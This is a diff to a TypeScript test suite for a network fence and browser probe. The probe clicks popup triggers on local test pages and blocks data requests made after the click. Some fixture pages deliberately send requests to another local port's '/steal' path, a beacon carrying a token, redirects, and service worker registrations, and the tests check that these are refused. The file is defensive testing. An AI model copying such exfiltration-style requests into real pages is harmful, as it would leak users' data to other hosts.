@@ -209,6 +209,28 @@ describe("the network fence", () => {
     }
   });
 
+  test("after the click, the fence passes only static files, by the Sec-Fetch-Dest the browser set", async () => {
+    const target = await serve(() => ({ body: "file" }));
+    const refused: string[] = [];
+    const fence = await startFence(target.origin, (r) => refused.push(`${r.kind}: ${r.words}`));
+    try {
+      const host = new URL(target.origin).host;
+      const get = (path: string, dest: string | null) => raw(fence, `GET ${target.origin}${path} HTTP/1.1\r\n${auth(fence)}host: ${host}\r\n${dest ? `sec-fetch-dest: ${dest}\r\n` : ""}connection: close\r\n\r\n`);
+      expect(await get("/before?q=1", "empty")).toMatch(/^HTTP\/1\.1 200 /);
+      fence.setAfterClick(true);
+      for (const dest of ["script", "style", "image", "font", "audio", "video", "track"]) expect(await get(`/static-${dest}`, dest), dest).toMatch(/^HTTP\/1\.1 200 /);
+      for (const dest of ["empty", "document", "iframe", "worker", "manifest", "report", null]) expect(await get(`/data-${dest}?q=1`, dest), String(dest)).toMatch(/^HTTP\/1\.1 403 /);
+      fence.setAfterClick(false);
+      expect(await get("/after", "empty")).toMatch(/^HTTP\/1\.1 200 /);
+      expect(target.requests.map((r) => r.path)).toEqual(["/before", "/static-script", "/static-style", "/static-image", "/static-font", "/static-audio", "/static-video", "/static-track", "/after"]);
+      expect(refused).toContain("data: the popup asked for data when it opened (GET /data-empty); it was blocked, so this was tested with its data blocked");
+      expect(refused.join(" ")).not.toContain("q=1");
+    } finally {
+      await fence.close();
+      target.server.close();
+    }
+  });
+
   test("a request line naming an address that doesn't parse is answered 400, and the fence keeps serving", async () => {
     const target = await serve(() => ({ body: "still here" }));
     const refused: string[] = [];
@@ -378,7 +400,8 @@ describe.skipIf(!HAVE_CHROMIUM)("the guarded probe in a real browser", () => {
       "/beacon": () => page(menu("Track", "m3b", "navigator.sendBeacon('/api/track?token=abc', 'x')")),
       "/other-port": () => page(menu("Elsewhere", "m4", `fetch('${OTHER}/steal?k=1').catch(() => {}); fetch('${OTHER_LOCALHOST}/steal-localhost').catch(() => {})`)),
       // A GET on the app's own address that redirects to another port: page routing never sees the next hop.
-      "/redirect": () => page(menu("Bounce", "m4b", "fetch('/bounce').catch(() => {})")),
+      // An image (a static file, allowed after the click), so the redirect itself is asked for.
+      "/redirect": () => page(menu("Bounce", "m4b", "new Image().src = '/bounce'")),
       "/bounce": () => "",
       // Both the instance's register and the prototype's (which an init script on the instance alone would miss).
       "/sw": () => page(menu("Cached", "m5"), "navigator.serviceWorker?.register('/sw.js').catch(() => {}); try { ServiceWorkerContainer.prototype.register.call(navigator.serviceWorker, '/sw.js?2').catch(() => {}); } catch {} const f = document.createElement('iframe'); document.body.append(f); try { f.contentWindow.ServiceWorkerContainer.prototype.register.call(f.contentWindow.navigator.serviceWorker, '/sw.js?3').catch(() => {}); } catch {}"),
@@ -417,6 +440,15 @@ describe.skipIf(!HAVE_CHROMIUM)("the guarded probe in a real browser", () => {
            try { new WebTransport("https://127.0.0.1:${udpPort}/page"); report("wt-page=made"); } catch { report("wt-page=refused"); }
            ${worker(`try { const wt = new WebTransport("https://127.0.0.1:${udpPort}/worker"); wt.ready.then(() => postMessage("wt-worker=ready"), () => postMessage("wt-worker=failed")); } catch { postMessage("wt-worker=refused"); } postMessage("rtc-worker=" + typeof RTCPeerConnection);`).replace(/;$/, "")}.onmessage = (e) => report(e.data);`,
         ),
+      // Data the popup asks for when it opens: fetch, XHR, EventSource, a worker's fetch; static files after the click; a GET on load.
+      "/mark-read": () => page(menu("Inbox", "d1", "fetch('/api/mark-read?id=42').catch(() => {})"), "fetch('/api/on-load?x=1').catch(() => {})"),
+      "/xhr": () => page(menu("Xhr", "d2", "const x = new XMLHttpRequest(); x.open('GET', '/api/xhr?q=1'); x.send()")),
+      "/eventsource": () => page(menu("Live feed", "d3", "new EventSource('/api/stream')")),
+      "/worker-get": () => page(menu("Worker get", "d4", worker(`fetch(${JSON.stringify(app.origin)} + "/api/worker-get").catch(() => {});`))),
+      "/static-after": () => page(menu("Static", "d5", "const s = document.createElement('script'); s.src = '/late.js'; document.head.append(s); new Image().src = '/api/track?id=1'")),
+      "/late.js": () => "new Image().src = '/log?late=ran';",
+      // A popup that only shows once its data arrives: with its data blocked, it never opens.
+      "/needs-data": () => page(`<button aria-haspopup="menu" aria-controls="nd" onclick="fetch('/api/items').then(() => document.getElementById('nd').hidden = false).catch(() => {})">Needs data</button><ul role="menu" id="nd" hidden><li>x</li></ul>`),
       "/blank": () => page(menu("Blank", "m10", "const a = document.createElement('a'); a.href = '/popup-blank'; a.target = '_blank'; document.body.append(a); a.click()")),
       "/confirm": () => page(menu("Ask", "m11", "confirm('Sure?')")),
       "/dupes": () => page(menu("More", "d1") + menu("More", "d2") + menu("Less", "d3")),
@@ -521,6 +553,7 @@ describe.skipIf(!HAVE_CHROMIUM)("the guarded probe in a real browser", () => {
     expect(JSON.stringify(result)).not.toContain("k=1");
     // The redirect itself was asked for (a GET on the app's own address); its next hop never left.
     const bounced = only(await probe("/redirect"));
+    expect(bounced).toMatchObject({ dataBlocked: false });
     expect(bounced).toMatchObject({ state: "incomplete", why: expect.stringMatching(/^the page tried to reach http:\/\/127\.0\.0\.1:\d+\/stolen, which isn't/) });
     expect(seen(app, "/bounce").length).toBe(1);
     expect(other.requests).toEqual([]);
@@ -590,6 +623,38 @@ describe.skipIf(!HAVE_CHROMIUM)("the guarded probe in a real browser", () => {
     expect(logged("rtc")).not.toContain("opened");
     expect(logged("wt-page")).not.toContain("made");
     expect(logged("wt-worker")).not.toContain("ready");
+  }, 60_000);
+
+  test("after the click, data requests are blocked and the popup is still tested, the result saying so; before it, the page's own load is untouched", async () => {
+    const result = only(await probe("/mark-read"));
+    expect(result).toMatchObject({ state: "opened", dataBlocked: true });
+    expect(result.info).toContain("the popup asked for data when it opened (GET /api/mark-read); it was blocked, so this was tested with its data blocked");
+    expect(JSON.stringify(result)).not.toContain("id=42");
+    expect(seen(app, "/api/mark-read")).toEqual([]);
+    // The GET the page made as it loaded went through, for discovery and for the scenario.
+    expect(seen(app, "/api/on-load")).toHaveLength(2);
+    for (const [path, asked] of [["/xhr", "GET /api/xhr"], ["/eventsource", "GET /api/stream"], ["/worker-get", "GET /api/worker-get"]] as const) {
+      const blocked = only(await probe(path));
+      expect(blocked, path).toMatchObject({ state: "opened", dataBlocked: true });
+      expect(blocked.info.join(" "), path).toContain(`(${asked})`);
+      expect(seen(app, asked.slice(4)), path).toEqual([]);
+    }
+    // sendBeacon is a POST: refused before and after the click, and still incomplete.
+    expect(only(await probe("/beacon"))).toMatchObject({ state: "incomplete" });
+  }, 90_000);
+
+  test("after the click, the page's own static files still load: a script it adds runs, and an image loads (one that changes data on a GET is out of reach)", async () => {
+    const result = only(await probe("/static-after"));
+    expect(result).toMatchObject({ state: "opened", dataBlocked: false });
+    expect(seen(app, "/late.js")).toHaveLength(1);
+    expect(logged("late")).toContain("ran");
+    // An image is a static file by type: it goes through, even to an /api path.
+    expect(seen(app, "/api/track")).toHaveLength(1);
+  }, 60_000);
+
+  test("a popup that opens only once its data arrives doesn't open, and the result names the blocked request", async () => {
+    expect(only(await probe("/needs-data"))).toMatchObject({ state: "incomplete", dataBlocked: true, why: "clicking the button didn't open anything we could identify (its data was blocked: GET /api/items)" });
+    expect(seen(app, "/api/items")).toEqual([]);
   }, 60_000);
 
   test("only triggers are clicked: never an item inside an opened menu; no key is ever sent", async () => {
